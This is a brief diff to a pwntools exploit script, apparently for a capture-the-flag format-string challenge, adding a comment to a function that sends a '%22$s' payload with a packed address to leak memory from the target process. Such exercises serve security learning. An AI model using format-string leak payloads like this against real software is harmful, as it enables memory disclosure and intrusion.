@@ -3,7 +3,7 @@ from pwn import *
 
 
 def level_3_0(p):
-    ''''''
+    '''put address we want to leak on stack which ends up as 22nd argument'''
     p.sendafter('Send your data!', b'%22$s       ' + p64(0x4040c0 + 0x70))
 
 
